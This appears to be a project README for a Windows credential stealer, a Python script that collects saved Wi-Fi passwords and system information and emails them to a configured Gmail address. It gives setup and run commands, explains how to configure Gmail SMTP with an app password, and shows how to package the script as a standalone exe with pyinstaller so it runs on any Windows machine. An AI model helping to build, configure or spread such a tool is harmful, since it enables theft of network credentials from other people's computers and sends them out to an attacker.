# Windows_info-wifi_password_extractor
The code is a Python script that retrieves Wi-Fi passwords for all the saved Wi-Fi networks on a Windows machine and sends an email containing the passwords and system information to a recipient email address.

# Installation Instruction
First, install the required modules:

```
pip3 install -r requirements.txt
```
Manually install any module that fails to install: pip3 install "module_name"

# Usage
The code uses the Gmail SMTP server to send the email, and the sender's Gmail account should have enabled "Allow less secure apps" to authenticate successfully. Also, make sure to replace the email_address and email_password variables with the sender's Gmail account email and password, respectively.
```
python win_extract.py
```

# GMAIL SMTP Setting
The password to use in the "email_password" is not your actual gmail password. you need to create App Password in your Google account setting and use that password instead.
[Read google blog for more info:](https://support.google.com/accounts/answer/185833?visit_id=638142470387740913-1545928851&p=InvalidSecondFactor&rd=1)
```
python stealer.py
```

# Convert it to exe to run on any windows machine
```
pyinstaller --onefile stealer.py
```
